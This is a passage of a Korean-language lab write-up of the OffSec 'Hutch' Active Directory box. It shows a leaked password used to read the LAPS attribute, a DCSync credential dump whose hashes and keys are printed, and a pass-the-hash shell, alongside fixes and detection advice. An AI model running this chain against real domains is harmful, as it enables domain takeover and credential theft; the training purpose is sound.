- 그 ACL 에 일반 사용자 `fmcsorley`(RID 1115)가 들어가 있음 — BloodHound 가 `ReadLAPSPassword` 엣지로 표시하는 것이 이것임. 익스플로잇도 크랙도 없이 속성 하나를 읽으면 끝
- 대상이 **DC** 라 그 값이 로컬 계정이 아니라 도메인 `Administrator` 의 비밀번호였음(NT 해시 대조로 확정). 도메인 관리자는 복제 확장 권한을 가지므로 그대로 DCSync 로 이어짐

**Vulnerability Fix:**
- `Find-AdmPwdExtendedRights -Identity <OU>` 로 LAPS 읽기 주체를 감사하고 헬프데스크 등 필요한 그룹만 남길 것
- **DC 는 LAPS 배포 대상에서 제외할 것.** 평문 저장 자체를 없애려면 Windows LAPS(`msLAPS-EncryptedPassword`)로 이전
- `ms-Mcs-AdmPwd` 에 SACL 을 걸어 읽기를 이벤트 4662 로 기록하고, DCSync 탐지를 위해 복제 GUID 가 찍힌 4662 를 상관 분석할 것

**Severity:** Critical — 일반 도메인 사용자에서 도메인 관리자로 즉시 승격, 도메인 전체 해시 탈취까지 이어짐

**Steps to reproduce the attack:**
1. `fmcsorley` 자격증명으로 `bloodhound-python -c all` 수집
2. `fmcsorley` 노드의 **아웃바운드 엣지**에서 `HUTCHDC` 로의 `ReadLAPSPassword` 확인
3. `pyLAPS.py --action get` 으로 `ms-Mcs-AdmPwd` 읽기 → `+CS0-.gm5l4o-[`
4. 그 값으로 `netexec smb -u administrator -d hutch.offsec` → `(Pwn3d!)`
5. `impacket-secretsdump` 로 DCSync → `Administrator` NT 해시
6. `evil-winrm -H <NT해시>` 로 PtH 대화형 셸

**BloodHound 수집**

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ bloodhound-python -u 'fmcsorley' -p 'CrabSharkJellyfish192' -ns 192.168.216.122 -d hutch.offsec -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hutch.offsec
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (hutchdc.hutch.offsec:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: hutchdc.hutch.offsec
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: hutchdc.hutch.offsec
INFO: Found 18 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: hutchdc.hutch.offsec
INFO: Done in 00M 13S
```

산출물 7개(`20260515132325_*.json`)가 Kali 에 남아 있고, 이 노트의 ACE·`adminCount`·그룹 판정은 전부 그 JSON 을 직접 조회해 얻은 것임. `Found 1 computers` 가 이 박스가 **단일 호스트**임을 확정함.

`[Errno -2] Name or service not known` 은 `getaddrinfo` 실패인데 바로 다음 줄에서 LDAP 연결이 성공함 — `-ns` 로 지정한 네임서버는 bloodhound-python 내부 해석기에만 쓰이고 Kerberos TGT 단계는 시스템 해석기(`/etc/resolv.conf`·`/etc/hosts`)를 타기 때문임. **[가정]** — 패킷을 뜨지 않아 단정하지 않음. `-k` 인증이나 S4U 를 실제로 써야 하는 단계에서는 이 이름 해석 문제가 그대로 치명상이 되므로 `/etc/hosts` 부터 등록하고 시작할 것:

```bash
echo "192.168.216.122  hutchdc.hutch.offsec hutch.offsec HUTCHDC" | sudo tee -a /etc/hosts
getent hosts hutchdc.hutch.offsec     # 빈 출력이면 등록 실패임
```

BloodHound UI 에서 `fmcsorley` → `HUTCHDC` 의 `ReadLAPSPassword` 엣지를 확인:

![[Pasted image 20260515142817.png]]

**LAPS 세대와 속성명** — 어느 쪽인지 모르면 「없는 것」과 「이름이 다른 것」을 혼동함.

| 세대 | 비밀번호 속성 | 만료 속성 | 저장 |
|---|---|---|---|
| 1세대 LAPS(별도 설치, 이 박스) | `ms-Mcs-AdmPwd` | `ms-Mcs-AdmPwdExpirationTime` | **평문** |
| Windows LAPS(2023~, OS 내장) | `msLAPS-Password` / `msLAPS-EncryptedPassword` | `msLAPS-PasswordExpirationTime` | 암호화 지원 |

1세대라는 근거는 실제로 쓴 도구의 소스임 — `~/git/pyLAPS/pyLAPS.py` 가 디스크에 있어 1차 사료가 됨:

```python
# :319-320  (--action get, 컴퓨터 미지정 시)
'(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))',
attributes=['sAMAccountName', 'objectSid', 'ms-Mcs-AdmPwd']
```

필터에 `(ms-MCS-AdmPwd=*)` 가 든 것이 요령임 — 읽을 수 있는 컴퓨터만 결과에 나옴. 권한이 없으면 AD 가 그 속성을 아예 반환하지 않아 개체가 필터에 걸리지 않으므로 **에러 없이 조용히 0건**이 될 수 있음. `--action set`(`:283`)은 `ms-Mcs-AdmPwd` 를 덮어쓰므로 실전에서 쓰지 말 것.

덤프에서 그 ACE 를 직접 확인:

```text
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-512  Group Owns
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-512  Group GenericAll
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-512  Group ReadLAPSPassword          # Domain Admins (정상)
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-1115 User  ReadLAPSPassword          # ★ fmcsorley (오설정)
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-526  Group AddKeyCredentialLink
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-527  Group AddKeyCredentialLink
HUTCHDC.HUTCH.OFFSEC <= S-1-5-21-...-519  Group GenericAll                # Enterprise Admins
HUTCHDC.HUTCH.OFFSEC <= ...-S-1-5-32-544  Group GenericWrite/WriteOwner/WriteDacl

{ "name": "HUTCHDC.HUTCH.OFFSEC", "laps": true }
```
— 출처: `~/PG/Hutch/20260515132325_computers.json` 을 `jq` 로 조회

**RID 1115 = `fmcsorley`** — `description` 이 비밀번호를 흘린 바로 그 계정이고, `haslaps: true` 로 LAPS 배포가 확인됨. DACL 수준에서 `ReadLAPSPassword` 는 `ms-Mcs-AdmPwd` 속성 집합에 걸린 `ControlAccess`(확장 권한) 또는 `ReadProperty` 이고, BloodHound 가 사람이 읽을 이름을 붙인 것뿐임. 그래서 `GenericAll` 을 가진 주체도 자동으로 LAPS 를 읽음 — 위 출력에서 Domain Admins 가 둘 다 가진 것처럼 보이는 이유임.

**pyLAPS — `ms-Mcs-AdmPwd` 읽기**

```bash
┌──(kali㉿kali)-[~/git/pyLAPS]
└─$ python pyLAPS.py --action get -d "hutch.offsec" -u "fmcsorley" -p "CrabSharkJellyfish192" --dc-ip 192.168.216.122 
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | HUTCHDC$             : +CS0-.gm5l4o-[
[+] All done!
```

![[Pasted image 20260515143503.png]]

**수동 대안 — 도구 없이 순수 LDAP.** 시험에서는 이쪽이 가장 안전함(`ldapsearch` 는 어디에나 있고 외부 도구 반입 논란이 없음):

```bash
ldapsearch -x -H ldap://<IP> -D 'fmcsorley@hutch.offsec' -w 'CrabSharkJellyfish192' \
  -b 'DC=hutch,DC=offsec' '(&(objectCategory=computer)(ms-MCS-AdmPwd=*))' \
  sAMAccountName ms-Mcs-AdmPwd
```

nxc 모듈(`nxc ldap <IP> -u .. -p .. -M laps`)과 `bloodyAD ... get object HUTCHDC$ --attr ms-Mcs-AdmPwd` 도 같은 속성을 읽음. `ms-Mcs-AdmPwd` 가 0건이면 Windows LAPS 의 `msLAPS-Password` 를 시도할 것 — 없는 게 아니라 이름이 다른 것일 수 있음.

**도메인 Administrator 확인**

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ netexec smb 192.168.216.122 -u administrator -p "+CS0-.gm5l4o-[" -d hutch.offsec
SMB         192.168.216.122 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.216.122 445    HUTCHDC          [+] hutch.offsec\administrator:+CS0-.gm5l4o-[ (Pwn3d!)
```

![[Pasted image 20260515144914.png]]

- `-d hutch.offsec` — 도메인 인증. `--local-auth` 였으면 로컬 SAM(=DSRM)을 대상으로 삼아 실패했을 것임
- `"+CS0-.gm5l4o-["` — 반드시 큰따옴표로 감쌀 것. `[` 는 zsh 글로빙 문자이고 `-` 로 시작하는 토큰은 플래그로 오인됨
- `(Pwn3d!)` — nxc 가 `ADMIN$` 쓰기 접근을 확인해 붙이는 표시임

**LAPS 값이 «도메인» Administrator 의 것이었음을 해시로 확정**

LAPS 는 원래 **로컬** 관리자 비밀번호를 관리하는데 이 값으로 **도메인** 인증이 통했음. NT 해시는 `MD4(UTF-16LE(비밀번호))` 이므로 직접 계산해 덤프와 대조하면 갈림. 2026-08-20 Kali 에서 실행:

```bash
┌──(kali㉿kali)-[~]
└─$ python3 -c "
import hashlib
pw = '+CS0-.gm5l4o-['
print(hashlib.new('md4', pw.encode('utf-16le')).hexdigest())"
d1722dc7b059af8df626c88ee2d279e4
```

| 계정 | 덤프의 NT 해시 | LAPS 비밀번호의 해시와 일치? |
|---|---|---|
| 도메인 `Administrator` (DRSUAPI 구간, RID 500) | `d1722dc7b059af8df626c88ee2d279e4` | **일치** |
| 로컬 SAM `Administrator` (SAM 구간, RID 500) | `bab179eba40e413086aa37742476c646` | 불일치 |

DC 로 승격되면 로컬 SAM 은 사실상 폐기되고 `Administrator` 는 도메인 계정이 됨. SAM 에 남는 RID 500 은 **DSRM(Directory Services Restore Mode) 계정**이라 평상시 로그온에 쓰이지 않음 — `bab179eb…` 가 그것이고 둘이 다른 것이 정상임.

**[가정]** 그러므로 「DC 에 LAPS 가 배포됨」 자체가 비정상 구성이고, 이 랩은 그 결과 도메인 Administrator 의 비밀번호가 LDAP 속성에 들어가도록 만들어져 있음. DC 측에서 어떤 방식으로 그렇게 됐는지(LAPS CSE 동작인지 랩 제작자의 수동 설정인지)는 **DC 내부를 볼 수 없어 확인 못 함.** 확정된 것은 위 해시 일치뿐임.

**DCSync**

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ impacket-secretsdump hutch.offsec/administrator:'+CS0-.gm5l4o-['@192.168.216.122
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xb24173e6ac9aa789ab05a4acceeb27ba
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bab179eba40e413086aa37742476c646:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
HUTCH\HUTCHDC$:aes256-cts-hmac-sha1-96:0c50a3c466970c9fb64b81a96f8b236e024650685332ee5a91ffc6e08d4a3da4
HUTCH\HUTCHDC$:aes128-cts-hmac-sha1-96:72d1943c93ea55ef1b876e505332ab64
HUTCH\HUTCHDC$:des-cbc-md5:b3109e01cd0b9215
HUTCH\HUTCHDC$:plain_password_hex:cfe66ec95c073fee9760be02b1a17f7cde75c45762b4dbc12360d83a81c5c428b3c382dbfd903cb123fd9da96662300d14afcd68b5d805728c14fca94e0a5fd634420ae3ffa8e6ab29c2814545b30bfbf3b8cdff4b2b143905849077f3ec4b7cea71d6f194bf5971bf96b80bd3ce4f519baa13d353ace8660605437ec58a8c33fde491dfe6bdaf9eea72bd1819b73d65c600419b36f79007f1221201f8d863838ee7587c5e98d0f9d7c1f08e0aa90af3f088100f29d963b30f7bd42fd460135403e1d2a8e197421f61f2710343d23a111ba720de6b8ad4b245079c2a3f868dd4ae269060af8d6d90f2244b2e35aa04b2
HUTCH\HUTCHDC$:aad3b435b51404eeaad3b435b51404ee:1e2712c1f76022c499c953c524f32155:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xb818f6846ad0c5c47237a32eee5c2c30b0f739c0
dpapi_userkey:0x9c047d0b5fde15f60714f1411579b93a45dd5872
[*] NL$KM 
NL$KM:41343fb6a2152f99e2aa6c708c5d08dac8d07ded67e93573a0314222c5a34cf2cdc3ee843e8626a0ec9148aba16285194f37c8bc784c6a543663950e82a07257
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1722dc7b059af8df626c88ee2d279e4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3c37d961d2fbbc1eb9e4d09f145ad361:::
hutch.offsec\rplacidi:1103:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\opatry:1104:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\ltaunton:1105:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\acostello:1106:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jsparwell:1107:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\oknee:1108:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jmckendry:1109:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\avictoria:1110:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\jfrarey:1111:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\eaburrow:1112:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\cluddy:1113:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\agitthouse:1114:aad3b435b51404eeaad3b435b51404ee:c11f1141ab4c1e825a11f15836e6978f:::
hutch.offsec\fmcsorley:1115:aad3b435b51404eeaad3b435b51404ee:83bcf188adc71adef071303fae29c1c7:::
hutch.offsec\domainadmin:1116:aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7:::
HUTCHDC$:1000:aad3b435b51404eeaad3b435b51404ee:1e2712c1f76022c499c953c524f32155:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72b3208e74a805b2a5eb19fdaefe646a0ab2ac20383f662005b98f50db5bc12e
Administrator:aes128-cts-hmac-sha1-96:1541be57c4bd258d96c5b21db72a06c7
Administrator:des-cbc-md5:8698d902ea9e9da4
krbtgt:aes256-cts-hmac-sha1-96:dc0de1944fc0218c5129c7b945f294be4940d5c4da9e632bc1c21c38a97974db
krbtgt:aes128-cts-hmac-sha1-96:927cd0e8ad96f8acfe8a76c15e2580d0
krbtgt:des-cbc-md5:023854fd2fd902dc
hutch.offsec\fmcsorley:aes256-cts-hmac-sha1-96:679828b1625b953fb96470e0712f3bfa7866ee99f260f289dff48a19cd80cc87
hutch.offsec\fmcsorley:aes128-cts-hmac-sha1-96:d12b8c1d7125196020760b917cc5d159
hutch.offsec\fmcsorley:des-cbc-md5:7a9b7cc4496104ab
hutch.offsec\domainadmin:aes256-cts-hmac-sha1-96:8d90904d735e652112c1947fdde2f0b1205d8df1944c286b1d24ec1187dae4aa
hutch.offsec\domainadmin:aes128-cts-hmac-sha1-96:29e412c68977461a3f4ead34c2886402
hutch.offsec\domainadmin:des-cbc-md5:bc10f7df49315dc7
HUTCHDC$:aes256-cts-hmac-sha1-96:0c50a3c466970c9fb64b81a96f8b236e024650685332ee5a91ffc6e08d4a3da4
HUTCHDC$:aes128-cts-hmac-sha1-96:72d1943c93ea55ef1b876e505332ab64
HUTCHDC$:des-cbc-md5:d3497f981fb5d367
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
```
*(각 사용자의 aes256/aes128/des 3줄 세트 중 일부는 생략함. 전량은 원본 세션에 있었고 형식은 위와 동일함.)*

![[Pasted image 20260515145041.png]]

`[*] Using the DRSUAPI method to get NTDS.DIT secrets` **한 줄이 DCSync 의 표식**임. AD 가 DC 간 복제에 쓰는 MS-DRSR 의 `IDL_DRSGetNCChanges` 를 「DC 인 척」 부르는 것이라 익스플로잇이 아니라 정상 기능의 오용이고, 패치로 막히지 않음. 필요한 확장 권한은 `DS-Replication-Get-Changes`(`1131f6aa-…`)와 **`DS-Replication-Get-Changes-All`(`1131f6ad-…`, 비밀 속성 포함)** 이며 Administrator 로 인증했으므로 충족됨. [[Resourced]] 의 오프라인 `ntds.dit` 파싱 출력에는 이 줄이 없고 `Searching for pekList` 가 나옴 — 두 기법을 가르는 한 줄임.

**사용자 12명의 NT 해시가 전부 같음** — RID 1103~1114(`rplacidi`…`agitthouse`)가 전원 `c11f1141ab4c1e825a11f15836e6978f` 임. 대량 계정 생성 시 초기 비밀번호를 동일하게 준 패턴이고, `fmcsorley`(1115)만 다른 이유는 `description` 이 적은 그대로임 — 「사용자 요청으로 재설정」. **설명 필드가 사실이었음이 해시로 교차 검증됨.** 하나만 크랙하면 12명분 평문이고, 크랙 없이 해시 그대로 12명 전원에게 PtH 가 됨. 참고로 `31d6cfe0d16ae931b73c59d7e0c089c0` 은 **빈 비밀번호의 NT 해시**이고 여기서는 `Guest`·`DefaultAccount` 가 그것임.

출력 끝의 예외는 결과와 무관함 — 원본 세션에는 `Cleaning up...` 뒤에 `KeyError: 'Cryptodome.Cipher.AES'` 트레이스백이 두 번 찍혔음. 파이썬 종료 중 `Registry.__del__` 이 이미 해체된 모듈을 참조해 나는 것이라 **덤프가 나온 뒤의 일**임. 이걸 보고 재실행하면 이벤트 4662 만 두 배로 남음.

**PtH → evil-winrm**

```bash
┌──(kali㉿kali)-[~/PG/Hutch]
└─$ evil-winrm -i 192.168.216.122 -u administrator -H d1722dc7b059af8df626c88ee2d279e4
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc'' for module Reline                                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> dir


    Directory: C:\Users\Administrator


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        11/3/2020   9:04 PM                3D Objects
d-r---        11/3/2020   9:04 PM                Contacts
d-r---        11/8/2020   5:32 PM                Desktop
d-r---        11/3/2020   9:04 PM                Documents
d-r---        11/3/2020   9:04 PM                Downloads
d-r---        11/3/2020   9:04 PM                Favorites
d-r---        11/3/2020   9:04 PM                Links
d-r---        11/3/2020   9:04 PM                Music
d-r---        11/3/2020   9:04 PM                Pictures
d-r---        11/3/2020   9:04 PM                Saved Games
d-r---        11/3/2020   9:04 PM                Searches
d-r---        11/3/2020   9:04 PM                Videos
```

비밀번호를 알면서 해시로 붙은 이유 셋 — ① `[`·`-`·`.` 이 섞인 비밀번호는 셸 인용 사고를 부름 ② **LAPS 비밀번호는 만료됨**(`ms-Mcs-AdmPwdExpirationTime` 이 지나면 갱신되고 옛 평문은 무효) ③ PtH 가 되는지 자체를 검증하게 됨. `evil-winrm --help` 실측 — `-H, --hash HASH → NTHash` 로 **LM 부분 없이 NT 해시만** 줌(impacket 의 `-hashes :NTHASH` 와 형식이 다름).

### Post-Exploitation

```bash
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/14/2026   6:40 PM             34 proof.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
14fb84ee9468eda117d59d5c6d378774
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::2ce0:eb4:6eab:6f2e%3
   IPv4 Address. . . . . . . . . . . : 192.168.216.122
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.216.254
```

![[Pasted image 20260515145246.png]]

**Proof.txt value:**
`14fb84ee9468eda117d59d5c6d378774` — `C:\Users\Administrator\Desktop\proof.txt`, evil-winrm 의 대화형 PowerShell 세션에서 원위치 `type`. `type proof.txt` 직후 `ipconfig` 를 쳐서 **플래그 값과 타겟 IP 가 한 화면**에 들어갔음. 더 확실히 하려면 한 줄로 `whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt`.

**`local.txt` 를 왜 못 얻었는가**

- **틀린 진단** — 「`fmcsorley` 로 셸을 안 열어봐서」. BloodHound 덤프가 이것을 반박함: `HUTCHDC` 의 `PSRemoteUsers` 가 `Collected: true` 인데 멤버 0명이고 `RemoteDesktopUsers`·`DcomUsers` 도 0명, `groups.json` 의 `REMOTE MANAGEMENT USERS@HUTCH.OFFSEC` 역시 0명임. 비교군으로 `LocalAdmins` 는 3명(RID 500 · Domain Admins · Enterprise Admins)이 정상 수집됐으므로 **수집 실패가 아니라 진짜로 비어 있음.** 즉 `evil-winrm -u fmcsorley` 는 시도했어도 실패했을 것임
- **맞는 진단** — 14:52 에 도메인 관리자 대화형 셸을 쥐고도 **`C:\Users` 를 한 번도 나열하지 않았음.** `cd Desktop` → `dir` → `type proof.txt` 로 곧장 갔고, 그 디렉터리에 `proof.txt` 하나뿐인 것을 보고 「플래그가 하나」라고 결론지었음. 관리자 프로필에 `local.txt` 가 없는 것은 정상인데 그것을 플래그 개수의 근거로 삼은 것임
- **재도전 시** — 이미 도메인 관리자이므로 별도 셸 없이 두 줄이면 됨:

```powershell
Get-ChildItem C:\Users -Force | Select-Object Name
type C:\Users\<저권한사용자>\Desktop\local.txt
```

  **[가정]** 후보 프로필을 `C:\Users\fmcsorley` 로 잡는 근거는 이 박스가 자격증명을 내주는 유일한 계정이 `fmcsorley` 라는 것뿐임 — 실제로 확인한 것이 아님. 그래서 위 명령의 첫 줄(`C:\Users` 나열)이 먼저임

**[가정]** `fmcsorley` 로 WinRM·RDP 가 안 되는데 PG 가 `local.txt` 를 저권한 프로필에 뒀다면 이 박스에 다른 초기 셸 경로가 설계돼 있었다는 뜻이 됨. 남은 후보는 **80/tcp IIS 10.0 의 WebDAV** 하나뿐임 — nmap 이 `PUT`·`MKCOL`·`MOVE` 를 보고했으나 **실제로 던져본 적이 없어 확정 못 함.** 설령 그 경로였더라도 웹셸로 읽은 플래그는 OSCP 에서 0점이므로([[Butch]]) 업로드한 `.aspx` 는 리버스셸 발판으로만 쓰고 플래그는 대화형 셸에서 읽어야 함.

**남긴 흔적**

| 흔적 | 위치 | 정리 |
|---|---|---|
| `RemoteRegistry` 서비스가 시작된 채 방치 | HUTCHDC | `secretsdump` 가 SAM/LSA 를 읽으려 시작시켰고 종료에 실패함(`ERROR_DEPENDENT_SERVICES_RUNNING`). 실전이라면 `sc.exe \\HUTCHDC stop RemoteRegistry`. **`-just-dc-ntlm` 은 DRSUAPI 만 쓰므로 이 흔적이 애초에 안 생김** |
| 스프레이 실패 로그 196 + 14건 | DC 보안 이벤트 4625 | 지울 수 없음 |
| DCSync 호출 | 이벤트 4662(복제 GUID) | 지울 수 없음. 성숙한 SOC 의 표준 탐지 규칙임 |
| kerbrute AS-REQ 14건 | 이벤트 4768/4771 | 지울 수 없음 |
| Kali 측 도메인 해시 덤프 | 로컬 | 도메인 전체 자격증명임. 암호화 보관 또는 파기 |

타겟에 업로드한 파일·생성한 계정·변경한 설정은 없음. 리버스셸·페이로드·웹셸을 하나도 쓰지 않았고 전 구간이 정식 프로토콜(LDAP·SMB·RPC·WinRM) 로그인이라 아웃바운드 차단·AV 탐지·TTY 승격 문제가 발생할 자리가 없었음.

## 관련

- LAPS — [Microsoft LAPS(1세대)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) · [Windows LAPS(2023+)](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- pyLAPS — <https://github.com/p0dalirius/pyLAPS> (Kali: `~/git/pyLAPS/pyLAPS.py`)
- kerbrute — <https://github.com/ropnop/kerbrute> (Kali: `~/PG/Hutch/kerbrute_linux_386`)
- AdminSDHolder / SDProp — [Protected Accounts and Groups in AD](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn535499(v=ws.11))
- DCSync / MS-DRSR — [IDL_DRSGetNCChanges](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/)
- LDIF 줄 접힘 — [RFC 2849](https://www.rfc-editor.org/rfc/rfc2849) §2 · LDAP 비트 매칭 규칙 `LDAP_MATCHING_RULE_BIT_AND` = `1.2.840.113556.1.4.803`
- [[_PLAYBOOK#A-51. AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다]] · [[_PLAYBOOK#A-65. 리버트되면 IP 가 바뀐다 — 노트의 IP 에는 «어느 세션»인지를 붙인다]]
- [[_PLAYBOOK#B-51. «사용자 설명 필드»는 AD 의 자격증명 저장소다]] · [[_PLAYBOOK#B-52. 실패 표시가 실패를 뜻하지 않는다 — NTLM 상태 코드를 읽는다]] · [[_PLAYBOOK#B-53. 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다]] · [[_PLAYBOOK#B-54. DC 컴퓨터 객체에 붙은 저권한 ACE는 곧 도메인 장악이다]]
- [[Resourced]] — **짝을 이루는 박스.** 같은 Server 2019 단일 DC, 같은 「텍스트 필드에 적힌 비밀번호」, 같은 「DC 컴퓨터 객체에 붙은 ACE」(거기서는 `GenericAll` → RBCD → S4U, 여기서는 `ReadLAPSPassword` → LAPS 평문). `ntds` 해시도 오프라인 파싱 vs DCSync 로 갈림
- [[Vault]] — AD 종합. DCSync · `SeBackupPrivilege` · GPO 남용
- [[Heist]] — NTLM 릴레이. 이 박스는 SMB 서명 강제라 그 경로가 막혀 있는 대조군
- [[Nagoya]] — Kerberoast·AS-REP roast 가 실제로 성공하는 AD. 여기서 0건이었던 경로를 거기서 봄
- [[Butch]] — 웹셸로 읽은 플래그는 0점이라는 규정 원문의 출처
- [[Crane]] · [[Squid]] — 「응답이 성공을 뜻하지 않는다」. nmap 의 WebDAV 메서드 목록이 같은 함정임
